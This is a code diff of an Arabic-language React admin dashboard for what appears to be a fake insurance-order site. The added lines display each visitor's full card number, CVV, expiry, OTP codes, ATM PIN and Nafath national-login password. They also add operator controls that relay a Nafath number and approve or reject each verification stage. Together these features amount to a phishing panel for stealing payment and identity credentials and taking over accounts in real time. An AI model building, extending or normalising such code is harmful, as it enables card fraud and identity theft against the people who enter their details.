                                 {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
+                                {/* Payment card info */}
+                                {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
+                                {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
+                                {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
+                                {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
+                                {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
+                                {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
+                                {/* OTP */}
+                                {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
+                                {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
+                                {/* ATM info */}
+                                {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
+                                {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
+                                {order.atm_pin && <InfoItem label="الرقم السري ATM" value={order.atm_pin} />}
+                                {/* Phone OTP */}
+                                {order.phone_otp_code && <InfoItem label="كود توثيق الجوال" value={order.phone_otp_code} />}
+                                {/* Nafath */}
+                                {order.nafath_password && <InfoItem label="كلمة مرور نفاذ" value={order.nafath_password} />}
+                                {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
+                                {/* Add-ons */}
                                 {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
                                   <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
                                 )}
                                 <InfoItem label="تاريخ الطلب" value={formatDate(order.created_at)} />
                               </div>
-                              {/* Stage approval buttons */}
-                              <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                  <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                    {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                  </Button>
-                                  <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                    {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+
+                              {/* Nafath number input for nafath stages */}
+                              {(order.current_stage === "nafath_login" || order.current_stage === "nafath_verify") && (
+                                <div className="space-y-2 pt-2 border-t border-border/50">
+                                  <div className="flex items-center gap-2">
+                                    <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
+                                    <input
+                                      type="text"
+                                      placeholder="أدخل الرقم (مثل 35)"
+                                      value={getNafathInputValue(order)}
+                                      onChange={e => setNafathInputValue(order.id, e.target.value)}
+                                      className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
+                                    />
+                                  </div>
+                                </div>
+                              )}
+
+                              {/* Nafath number update for already set */}
+                              {order.nafath_number && order.current_stage === "nafath_verify" && (
+                                <div className="flex items-center gap-2 pt-2 border-t border-border/50">
+                                  <span className="text-[10px] text-muted-foreground whitespace-nowrap">تعديل الرقم:</span>
+                                  <input
+                                    type="text"
+                                    placeholder={order.nafath_number}
+                                    value={getNafathInputValue(order)}
+                                    onChange={e => setNafathInputValue(order.id, e.target.value)}
+                                    className="flex-1 h-8 rounded-lg border-2 border-amber-400 bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
+                                  />
+                                  <Button onClick={() => handleUpdateNafathNumber(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
+                                    {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}تحديث
                                   </Button>
                                 </div>
+                              )}
+
+                              {/* Approve/Reject */}
+                              <div className="flex items-center gap-2 pt-2 border-t border-border/50">
+                                <Button onClick={() => handleStageApprove(order.id, (order.current_stage === "nafath_login" || order.current_stage === "nafath_verify") ? getNafathInputValue(order) : undefined)} disabled={loadingAction !== null || ((order.current_stage === "nafath_login" || order.current_stage === "nafath_verify") && !getNafathInputValue(order))} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                  {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
+                                </Button>
+                                <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
+                                  {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                </Button>
+                              </div>
                             </div>
                           ))}
                         </div>
                       )}
+
+                      {/* No data message */}
+                      {!visitorName && !visitorPhone && !visitorNationalId && linkedRequests.length === 0 && linkedOrders.length === 0 && (
+                        <p className="text-xs text-muted-foreground text-center py-3">لا توجد بيانات مقدمة من الزائر</p>
+                      )}
                     </AccordionContent>
                   </AccordionItem>
 
-                  {/* 1. معلومات الزائر (الشخصية) */}
-                  <AccordionItem value="visitor-info" className="border border-border rounded-xl overflow-hidden">
-                    <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                      <div className="flex items-center gap-2">
-                        <User className="w-4 h-4 text-primary" />معلومات الزائر
-                      </div>
-                    </AccordionTrigger>
-                    <AccordionContent className="px-4 py-3">
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                        {visitorName && (
-                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                            <User className="w-4 h-4 text-primary shrink-0" />
-                            <div><p className="text-[10px] text-muted-foreground">الاسم</p><p className="text-xs font-medium text-foreground">{visitorName}</p></div>
-                          </div>
-                        )}
-                        {customerName && customerName !== visitorName && (
-                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                            <User className="w-4 h-4 text-primary shrink-0" />
-                            <div><p className="text-[10px] text-muted-foreground">اسم العميل</p><p className="text-xs font-medium text-foreground">{customerName}</p></div>
-                          </div>
-                        )}
-                        {visitorPhone && (
-                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                            <Phone className="w-4 h-4 text-primary shrink-0" />
-                            <div><p className="text-[10px] text-muted-foreground">رقم الجوال</p><p className="text-xs font-medium text-foreground">{visitorPhone}</p></div>
-                          </div>
-                        )}
-                        {visitorNationalId && (
-                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                            <CreditCard className="w-4 h-4 text-primary shrink-0" />
-                            <div><p className="text-[10px] text-muted-foreground">رقم الهوية</p><p className="text-xs font-medium text-foreground">{visitorNationalId}</p></div>
-                          </div>
-                        )}
-                        {selectedVisitor.country && (
-                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                            <Globe className="w-4 h-4 text-primary shrink-0" />
-                            <div><p className="text-[10px] text-muted-foreground">الدولة</p><p className="text-xs font-medium text-foreground">{countryFlag(selectedVisitor.country_code)} {selectedVisitor.country}</p></div>
-                          </div>
-                        )}
-                        {selectedVisitor.ip_address && (
-                          <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                            <Globe className="w-4 h-4 text-muted-foreground shrink-0" />
-                            <div><p className="text-[10px] text-muted-foreground">عنوان IP</p><p className="text-xs font-medium text-foreground">{selectedVisitor.ip_address}</p></div>
-                          </div>
-                        )}
-                        <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                          <Clock className="w-4 h-4 text-primary shrink-0" />
-                          <div><p className="text-[10px] text-muted-foreground">آخر نشاط</p><p className="text-xs font-medium text-foreground">{formatTime(selectedVisitor.last_seen_at)}</p></div>
-                        </div>
-                        <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                          <MapPin className="w-4 h-4 text-primary shrink-0" />
-                          <div><p className="text-[10px] text-muted-foreground">الصفحة الحالية</p><p className="text-xs font-medium text-foreground">{selectedVisitor.current_page || "/"}</p></div>
-                        </div>
-                        <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
-                          <Clock className="w-4 h-4 text-primary shrink-0" />
-                          <div><p className="text-[10px] text-muted-foreground">تاريخ الزيارة الأولى</p><p className="text-xs font-medium text-foreground">{formatDate(selectedVisitor.created_at)}</p></div>
-                        </div>
-                      </div>
-                    </AccordionContent>
-                  </AccordionItem>
-
-                  {/* المحادثات */}
+                  {/* Chat */}
                   <AccordionItem value="chat" className="border border-border rounded-xl overflow-hidden">
                     <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                       <div className="flex items-center gap-2">
